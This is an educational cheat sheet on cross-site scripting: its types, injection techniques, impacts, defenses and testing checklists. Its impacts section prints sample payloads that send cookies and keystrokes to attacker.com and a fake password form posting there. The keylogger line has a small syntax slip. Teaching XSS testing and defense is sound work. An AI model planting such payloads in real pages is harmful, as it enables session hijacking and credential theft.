# Cross-Site Scripting (XSS) Vulnerabilities Notes:
## Overview
Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. The malicious scripts run in the context of the victim’s browser, potentially leading to session hijacking, data theft, defacement, and the distribution of malware. XSS is categorized based on how the malicious scripts are delivered and executed: Stored, Reflected, and DOM-based.

## Types of XSS
1. Stored XSS (Persistent XSS)
    - Description: The malicious script is permanently stored on the target server (e.g., in a database, comment field, or message board). When another user views the affected page, the script is executed in their browser.
    - Example: An attacker submits a malicious JavaScript payload in a comment form. When other users view the comment, the script runs automatically.
        - ```<script>alert('XSS')</script>```
    - Impact: Since the payload is stored, every user who views the infected page can be affected, leading to widespread compromise.
2. Reflected XSS (Non-Persistent XSS)
    - Description: The malicious script is reflected off the web server, usually via a URL or form submission, and is executed immediately when a victim interacts with the crafted link.
    - Example: The attacker sends a victim a malicious link with a script embedded in the query parameter:
        - ```http://example.com/search?query=<script>alert('XSS')</script>```
    - Impact: Typically requires social engineering (e.g., sending a crafted URL), but it can still lead to session hijacking or data theft.
3. DOM-Based XSS
    - Description: The vulnerability exists in the client-side JavaScript, where data is dynamically inserted into the web page’s DOM without proper sanitization. The attack occurs entirely within the browser.
    - Example:
        - ```document.location.href = "http://example.com/welcome?name=" + document.getElementById('name').value;```
        - If user input is directly inserted into the DOM without sanitization, it can result in XSS.
    - Impact: No server interaction is required. The vulnerability occurs entirely on the client-side, making it harder to detect.

## Exploitation Techniques
1. Script Injection
    - Technique: Injecting malicious JavaScript code into input fields or URL parameters to execute in the browser.
    - Example:
        - ```<script>alert('XSS')</script>```
    - Testing: Inject ```<script>alert(1)</script>``` into various input fields (e.g., comment forms, search bars) and check if it executes.
2. Event Handlers
    - Technique: Injecting JavaScript into attributes that trigger events (e.g., ```onload```, ```onclick```, ```onmouseover```).
    - Example:
        - ```<img src="x" onerror="alert('XSS')">```
    - Testing: Inject event handlers into fields and parameters that accept HTML content.
3. Attribute Injection
    - Technique: Injecting malicious scripts into HTML attributes, such as ```src```, ```href```, or ```style```.
    - Example:
        - ```<a href="javascript:alert('XSS')">Click here</a>```
    - Testing: Test if user input is injected into attributes like ```href``` or ```src``` without proper sanitization.
4. JavaScript Protocol Injection
    - Technique: Exploiting unsafe handling of URLs where the javascript: protocol is allowed, leading to script execution.
    - Example:
        - ```<a href="javascript:alert('XSS')">Click me</a>```
    - Testing: Check if links or inputs accept the ```javascript:``` protocol.

## Real-World Impacts of XSS
1. Session Hijacking
    - Description: XSS can steal session cookies using ```document.cookie```, allowing the attacker to hijack the victim’s session.
    - Example:
        - ```<script>document.location='http://attacker.com?cookie=' + document.cookie</script>```
    - Impact: The attacker gains control over the victim’s session, possibly leading to account takeover.
2. Keylogging
    - Description: XSS can capture user input (e.g., keystrokes, form submissions) by injecting a keylogger script.
    - Example:
        - ```<script> document.onkeypress = function(e) {  var key = e keyCode || e.which;  document.location='http://attacker.com?key=' + String.fromCharCode(key);} </script>```
    - Impact: Sensitive data like passwords or credit card numbers can be stolen.
3. Content Spoofing / Defacement
    - Description: Attackers can inject scripts that modify the appearance or content of a web page to mislead users or damage the site’s reputation.
    - Example:
        - ```<script>document.body.innerHTML="Hacked by Attacker"</script>```
    - Impact: Attackers can deface websites or display false information.
4. Phishing Attacks
    - Description: Attackers inject fake forms or login screens to capture user credentials.
    - Example:
        - ```<form action="http://attacker.com/steal" method="post">  Enter your password: <input type="password" name="password"></form>```
    - Impact: Users may unknowingly submit sensitive information directly to the attacker.

## Defense Mechanisms Against XSS
1. Input Validation
    - Description: Ensure all user inputs are validated to only accept safe characters and formats.
    - Best Practices:
         - Use whitelisting to only allow acceptable characters (e.g., alphanumeric).
        - Avoid allowing special characters like ```<```, ```>```, ```'```, ```"```, ```&``` unless necessary.
2. Output Encoding
    - Description: Encode user input when displaying it on a web page to neutralize any malicious characters.
    - Best Practices:
        - Use appropriate encoding for the context (e.g., HTML encoding for content, URL encoding for URLs).
        - Escape characters like ```<```, ```>```, ```'```, and ```"```.
    Example (HTML encoding):
        - ```&lt;script&gt;alert('XSS')&lt;/script&gt;```
3. Content Security Policy (CSP)
    - Description: Implement a CSP header to control which scripts can be executed on the page.
    - Best Practices:
    - Set ```Content-Security-Policy: script-src 'self';``` to only allow scripts from the same domain.
    - Disallow inline scripts and unsafe-eval to block dangerous JavaScript execution.
4. HTTPOnly Cookies
    - Description: Use the ```HttpOnly``` flag on cookies to prevent JavaScript access to sensitive session cookies.
    - Best Practices:
        - Set ```HttpOnly``` on all session cookies.
        - Use the ```Secure``` flag in conjunction to ensure cookies are only transmitted over HTTPS.
5. Sanitize HTML Content
    - Description: Use libraries or built-in functions to sanitize user-generated HTML content to remove malicious scripts.
    - Best Practices:
        - Strip or escape any JavaScript within HTML attributes.
        - Use trusted libraries like DOMPurify to sanitize HTML safely.

## Testing for XSS
1. Manual Testing
    - Inject Basic XSS Payloads:
        - Try ```<script>alert(1)</script>``` in various input fields (comments, search bars, forms) to check if the application executes the script.
    - Test HTML Attributes:
        - Inject payloads into attributes like ```href```, ```src```, ```title```, or ```onerror``` to see if the input is executed.
    - Event Handlers:
        - Test event handlers like onload, onclick, and onmouseover to see if scripts are executed when the event is triggered.
2. Automated Testing Tools
    - Burp Suite:
        - Use the Scanner or Intruder to automatically inject XSS payloads into all parameters.
    - OWASP ZAP:
        - Utilize ZAP's XSS scanner to test for common injection points.
3. DOM-Based XSS Testing
    - Inspect JavaScript Code:
        - Look for places where user input is inserted directly into the DOM using ```innerHTML```, ```document.write()```, or ```location.href```.
    - Test URL Parameters:
        - Inject payloads into URL parameters and hash fragments to see if the input is reflected in the DOM without sanitization.

## XSS Testing Checklist
1. Test Input Fields: Inject <script>alert(1)</script> and event handlers (e.g., ```onerror```) into various input fields and check for script execution.
2. Check HTML Attributes: Inject payloads into ```href```, ```src```, and other attributes to see if JavaScript is executed.
3. Test URL and Query Parameters: Attempt to inject XSS via URL parameters and observe if the payload is reflected or executed.
4. Inspect Client-Side Code: Look for unsafe handling of user input in client-side JavaScript (e.g., ```innerHTML```, ```eval()```).
5. Check CSP Headers: Ensure CSP headers are set to block inline scripts and untrusted sources.

## XSS Defense Checklist
1. Validate and Sanitize Input: Implement strict input validation and sanitation for all user input.
2. Escape Output: Use proper encoding (HTML, JavaScript, or URL) when displaying user input in the browser.
3. Use Content Security Policy (CSP): Implement a restrictive CSP to control which scripts can run on your pages.
4. Use HTTPOnly and Secure Cookies: Protect session cookies by using ```HttpOnly``` and ```Secure``` flags to prevent access via JavaScript.
5. Sanitize Dynamic HTML Content: Use trusted libraries (e.g., DOMPurify) to sanitize any user-generated HTML content.

## Final Notes
- XSS: One of the most common vulnerabilities in web applications, leading to a wide range of attacks, including session hijacking, phishing, and keylogging.
- Mitigation: Focus on input validation, output encoding, and implementing a strong Content Security Policy (CSP).
- Testing: Use both manual and automated tools to thoroughly test all input fields, URLs, and JavaScript execution points for XSS vulnerabilities.
- This sheet provides a detailed overview of Cross-Site Scripting (XSS) vulnerabilities, their impacts, exploitation techniques, and defenses, along with testing strategies to identify and mitigate these issues.